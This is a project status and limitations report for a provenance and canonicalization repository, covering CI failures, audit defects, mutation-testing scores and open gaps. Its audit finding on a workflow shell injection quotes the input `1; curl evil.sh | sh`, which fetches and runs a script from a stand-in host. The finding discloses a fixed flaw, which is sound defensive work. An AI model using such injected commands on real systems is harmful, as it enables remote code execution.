# Status and Limitations — 2026-08-02

Tier: **core**. This document exists to be used against the project.

Every number below was produced by a command in this repository and can be
regenerated. Where something is broken, it is named as broken. There is no
summary grade: a self-assigned score has no rubric, no denominator, and no
external validation, and this repository's own reporting rules forbid exactly
that shape of claim. What replaces it is §5 — the specific things that are not
established, stated plainly enough to be checked.

Scale: ~945 tracked files, ~67k lines of TypeScript, ~3k of Rust, 14 TLA+
specifications, 155 test files / 1,193 tests.

---

## 1. The most serious defect found in audit

**Continuous integration failed on `main` for 40+ consecutive runs, from
2026-07-17 to 2026-08-01, while `docs/artifact/CI_COVERAGE.md` described those
same artifacts as "verified on every push and pull request."**

The document written specifically to stop a reviewer being misled was, for two
weeks, the most misleading file in the repository. Four independent causes, each
of which had hidden the same way — by being invisible on the development host:

| Cause | Why it hid |
|:---|:---|
| `npm ci` → `ERESOLVE` (`@vitejs/plugin-react@6` → `vite@8` → `esbuild ^0.27\|\|^0.28` vs a root pin of `^0.25.5`) | The developer's `~/.npmrc` carries `legacy-peer-deps=true`, which downgrades ERESOLVE to a warning. Every local run was green. **"Works locally" was machine-local config doing invisible work.** |
| `cargo fmt --check` failed on all three crates | Never run before pushing. |
| `dab/gateway/src/v200.rs` did not compile | Used a bulk `DescribePCRs` NSM API that does not exist, behind `#[cfg(target_os = "linux")]`. macOS never compiled it; CI always did. |
| `cgroupOrchestrator.test.ts` asserted a mock-fallback value | The fallback is reached only when the real `/proc` lookup fails — so it passed on macOS, where cgroups do not exist, and failed on Linux, where the feature is real. |

Diagnosis required reproducing the runner in Docker. Four earlier hypotheses —
lockfile desync, platform-constrained packages, `engines` mismatch,
case-sensitivity — were each checked and each wrong. **Local reproduction could
not have found this, because the local machine was the defect.**

All three workflows are green as of 2026-08-02.

## 2. What was found inside the code

**`v200.rs` returned a fabricated attestation pass.** Off-Linux,
`fetch_local_pcrs` returned `EXPECTED_GHOST_ARK_V200_HASH` — the exact constant
`verify_and_merge_intent` compares against — so hardware attestation passed
unconditionally on the dev host while the real path could not build. The
"pristine hash" is the ASCII string `v200-pristine-hash-placeholder`;
`DummyLwwMap::apply` returns `"sha256:merged-state-root-placeholder"`. A
placeholder labelled as a digest is the defect this repository already retracted
once (`"ci": "sha256:A"` under "Raw Benchmark Output"). **It recurred, in the
library, for weeks, with zero tests.** Quarantined.

**A pinned hash that verified nothing, for sixteen days.**
`scripts/run-proofs.sh` pinned tla2tools sha256 `58d44845…` on 2026-07-15. TLA+
v1.8.0 was first published 2026-07-31 — the URL 404'd on the day it was pinned,
so that digest can never have been computed from the file it claims to pin, and
it matches no obtainable artifact. The proof stage of `make reproduce` therefore
checked **zero specifications** while `tools/proofs/run-tlc.sh` fetched the same
jar with **no integrity check at all** and reported green. Both runners now
verify one digest read from one place. The residual limitation is stated: it is
trust-on-first-use, because no independent publication of that artifact exists.

**A shell injection this repository introduced.** `mutation.yml` interpolated a
`workflow_dispatch` input directly into a `run:` block — `1; curl evil.sh | sh`
would have executed. Written by this project two commits before semgrep caught
it. Fixed via `env:` plus integer validation; ERROR-severity findings back to 0.

**E1's own harness reported a different headline by environment.** With `python3`
present `universal_unintended_kernel` is 4; absent, 5 — both exiting 0. E1 now
refuses to emit a census with a missing arm.

**E7's headline depends on the jq version.** jq 1.7 preserves large integers; 1.6
does not. On ≥1.7 V8 is the lone outlier on the 2^53 class; on 1.6 CPython is.
Debian ships 1.6, Homebrew 1.7.1. The published finding now carries that
qualifier.

**The claim gate had an extension-shaped blind spot.** A 363 KB context dump sat
at the repository root as `.txt`, which the scanner does not read; in a scanned
extension it trips 319 findings, and it preserved a retracted zero-day banner at
its pre-quarantine path. Removed; a hygiene test blocks the pattern.

## 3. E10 — the trust kernel now has a measured, gated test strength

All ten declared kernel files, swept one per Stryker invocation. Host
darwin/arm64, Apple M1 ×8, node v22.22.3.

| | first sweep | now |
|:---|---:|---:|
| covered score | 72.3% (974/1347) | **85.8%** (1345/1568) |
| Stryker total | 60.6% | **83.6%** |
| survivors | 373 | **223** |
| **unreached mutants** | **261 (16.2%)** | **40 (2.5%)** |

Six modules were remediated against their own survivor lists and re-measured:
`emission` 56.3 → 98.1%, `chain` 81.7 → 95.4%, `kmsVerifier` 48.1 → 93.9%,
`canonical` 61.0 → 86.7%, `keyManifest` 61.0 → 83.6%, `signer` 61.4 → 73.2%.

**What the unreached code was is the finding, not the percentage.** In
`kmsVerifier` it was the key-identity *rejections* — missing `keyId`,
`!immutableKmsKeyIdsMatch`, response-`KeyId` mismatch. In `emission`, the
empty-secret guard, `IntegrityCollisionError`, `ChainHeadConflictError`, and the
throw when a KMS signer exposes a mutable alias. In `canonical`, the two
execution-boundary assertions that stop a development default reaching a
production receipt. In `chain`, every continuity detection. **`AGENTS.md` names
immutable KMS key ARNs as a hard requirement; the code enforcing it was
unexecuted.** The pattern held in all six: the guards were the untested part.

**The gate has been wrong once and now moves only after measurement.** `break`
went 75 → 58 → 70 → 80: 75 was chosen on two files' evidence when the full sweep
held 60.6% — a threshold declared rather than met, committed here and corrected.

**Three defects in the new tests were found by re-measuring, not by reading
them.** A `decision()` fixture omitted `actionTaken` and used an out-of-enum
outcome; an `options.signer ?? default` helper swallowed the `null` a test passed
deliberately, so *"rejects a non-object signer"* never reached the validator it
named; and an `IntegrityCollisionError` assertion expected the stored receipt id
where the code reports the incoming one. Earlier, two tests asserted a bare
`.toThrow()` against checks whose removal still throws — later, for a different
reason. **An assertion that cannot distinguish *failed for the right reason* from
*failed for some reason* is not a test of that check.** That is E4's tautology,
found inside tests written to close an E10 gap.

**Two unkillable survivors are real findings.** `emission.ts:134` — the terminal
`throw new ChainHeadConflictError("Receipt chain head kept advancing")` after the
retry loop — is **unreachable**: every path returns, continues, or throws, and
`continue` is guarded by `attempt < 2`. It reads as a safety net and is not one.
The same analysis makes the `attempt < 3` bound and `kmsVerifier`'s `!keyId`
guard equivalent-mutant territory. Recorded with the argument, not chased.

## 3b. E11 — third-party evidence for the generality claim

§6 of the previous assessment argued the highest-value move was pointing the
kernel harness at a canonicalizer this project did not write. That is now done.
E11 runs the same pre-registered alphabet and the same verdict function against
four pipelines written entirely outside this repository — Rust `serde_json`,
Ruby, CPython, jq — in four language ecosystems, by four groups who never saw
this alphabet.

| arm | unintended kernel members |
|:---|---:|
| `rust-serde-json` | 4 |
| `ruby-json` | 4 |
| `cpython-json` | 4 |
| `jq-sorted` | 4 |

**What it confirmed.** Every third-party arm exhibits kernel members, and three
duplicate-key classes collapse in *all four*. NFC/NFD over-discrimination is also
universal. Corollary C2 — the kernel is a property of the problem, not of
Ghost-Ark's implementation — now rests on evidence from outside this repository
for those classes.

**What it refuted, and this is the more valuable half.** E1 lists
`integer-precision-loss` among its universal kernel members. All four third-party
arms score **sound** on it. Four of E1's five arms parse with V8, whose only
number type is a double; `serde_json`, Ruby, CPython, and jq 1.7 all preserve
integer precision. **The 2^53 collapse is a property of double-backed number
models, not of JSON.** E1's claim was broader than its arm mix could support, and
the experiment built to generalize it instead narrowed it. That is the outcome an
honest generality test is supposed to be able to produce, and it did.

E11 also found a divergence class E7 could not see: Rust and Ruby fail closed on
deep nesting where CPython and jq accept it, so recursion-depth limits are an
availability boundary that differs per ecosystem.

**What it does not fix.** E11 tests *canonicalization*, not *receipt
verification*. The verifier-independence gap in §5 is untouched: all three
Ghost-Ark verifiers still share one author.

## 4. What the evidence supports

- **The doctrine works, and it is not decoration.** Every defect above was found
  by applying rules this repository wrote down first — the E4 discriminator,
  "report what was not measured," "no proportion without its denominator." The
  rules located real bugs in the code that authored them.
- **Negative results are published.** E7's finding — no two of three JSON
  pipelines induce the same equivalence relation — is a result against the
  project's own convenience, in README-linked docs rather than a footnote.
- **Invariants are directionally asserted.** TLA+ specs ship with mutants that
  must violate; a green spec with no failing mutant is not accepted as evidence.
- **The Provenance Kernel Problem is a real contribution.** `Sound(C, Σ, P)` is
  ternary, monotone in Σ and antitone in P, so soundness does not persist with
  `C` unchanged and no bug introduced. E6 measures the antitonicity on the
  implementation rather than assuming it.
- **Remediation is measured, not asserted.** Every claim of improvement in §3 is
  a before/after on a pinned scope, and the pinning is enforced by a test that
  recomputes the scope from the import graph.

## 5. What is not established

Three limitations bound everything above. They are listed first because they are
the reasons a reader should discount the rest, not footnotes to it.

**1. No third party has independently run or reviewed this.** Every verifier,
every experiment, and this document were produced by one author working with an
AI assistant under that author's rules. E5 reports zero disagreements across
three verifiers — written by the same person from the same specification, so they
can share a single misreading, and agreement between them does not detect it.
E11 narrows this for canonicalization by measuring four implementations written
elsewhere, but it does not touch receipt verification. **This is the largest
unaddressed weakness and no amount of internal rigour substitutes for it.**

**2. Falsifier F2 remains open.** E1 establishes that unintended kernel members
exist; it does not establish how often they occur. Every rate reported here comes
from a declared synthetic generator over a hand-curated alphabet. E11 removes the
"artifact of this implementation" form of the objection but not the "artifact of
the author's chosen pathologies" form. Only a corpus this project did not author
closes it.

**3. The cloud path is synthesis-only.** No live AWS evidence bundle exists.
Every AWS-path statement is local-only or CDK-synth-only, and the KMS signing
path has never executed against KMS. The `kms-style-rsa` fixture is a local
simulation of the algorithm, not KMS evidence.

Beyond those three: E10 covers the receipt trust kernel and nothing else — policy
evaluation, runtime, vault, retrieval, and the gateway have no measured test
strength. Two TLA+ specification families are unchecked. The `dab/roundtrip` and
k8s round-trips exist as recorded runs rather than reproduced ones. Semgrep runs
without gating on its 96 findings. The full matrix, including what CI does *not*
verify, is in [CI_COVERAGE.md](./CI_COVERAGE.md).

## 6. Direction

The temptation is to describe a product. The repository is not one and should not
pretend to be. What it actually has is a **result** and an **instrument**, and
they have different futures.

**The result is portable and underexploited.** "Receipt soundness is ternary and
does not persist" is not a statement about Ghost-Ark. It applies to any system
that assigns identity by canonicalization — content-addressed stores, SBOM
digests, transparency logs, model-artifact hashes, provenance attestations. E7
shows the failure is not hypothetical: three mainstream JSON pipelines induce
three different equivalence relations, and the disagreement includes `1` vs
`1.0`. **The natural next artifact is not a bigger Ghost-Ark. It is the E1/E7
harness pointed at somebody else's canonicalizer** — in-toto, Sigstore bundles,
SPDX, a model registry. That is a paper, it needs no AWS, and it converts the
formalism from self-referential to general.

**The instrument's value is the discipline, not the code.** The parts worth
carrying into a lab are the ones that make dishonesty expensive: a claim scanner
that fails the build on assurance language; `reportProportion` that structurally
refuses an interval over a census; TLA+ specs paired with mutants that must
violate; a pre-registered mutation scope recomputed from the import graph. Those
are ~2,000 lines and reusable across projects. Most of the other 66,000 is a
demonstration substrate.

**What would make the strongest possible version of this work.** In order of
leverage per unit effort:

1. **Get one outside person to break it.** A second implementer writing a
   verifier from the specification alone, or a reviewer running
   `REVIEWER_ATTACK_SHEET.md` adversarially. This is the highest-value action
   available and it costs nothing but asking. It converts §5's largest weakness
   from open to addressed, and it is the only item here that no amount of solo
   work can substitute for.
2. ~~Point E1/E7 at a canonicalizer this project did not write.~~ **Done — E11.**
   Four third-party arms, and the result cut both ways (§3b). What remains of
   this line is the *alphabet* objection: E11 removes "artifact of Ghost-Ark's
   implementation" but not "artifact of the author's chosen pathologies". Only a
   corpus this project did not author closes that.
3. **One bounded live-AWS window.** Not a deployment — a single recorded
   evidence bundle that moves the KMS path from `AWS-synth-only` to `AWS-live`.
   The runbooks already exist.
4. **Extend E10 past the receipt kernel.** Policy evaluation, runtime, vault,
   retrieval, gateway have no measured test strength at all.
5. ~~Publish E11 as a standalone probe.~~ **Done — `kernel-probe`.** Point it at
   any command reading JSON on stdin and writing a canonical form on stdout, and
   it reports which distinctions that canonicalizer destroys:
   `npm run kernel-probe -- --command "jq -S -c ."`. `--emit-alphabet` writes the
   corpus as JSON so it runs in any language without this repository.
   Documented for outside readers in `docs/research/KERNEL_PROBE.md`, and
   calibrated against canonicalizers whose kernels are known by construction —
   a constant emitter (17 unintended-kernel, 0 over-discrimination), a byte
   echo (0 and 14), and a refuse-all (31 fail-closed, 0 sound). 17 + 14 = 31
   exactly, disjoint, and the refusing case is never scored sound.

**What to resist.** Building more surface. The repository's credibility comes
from the ratio of *claims made* to *evidence attached*, and every new subsystem
without an experiment behind it moves that ratio the wrong way. The quarantine
directories exist because that lesson was learned expensively, twice.

## 7. Not claimed

This document reports engineering status and known limitations. It is not
evidence of security, correctness, compliance, or production readiness, and it is
not an external review. **The repository has never been audited by anyone other
than its author and an AI assistant operating under its rules** — which is
precisely why item 1 of §6 is item 1.
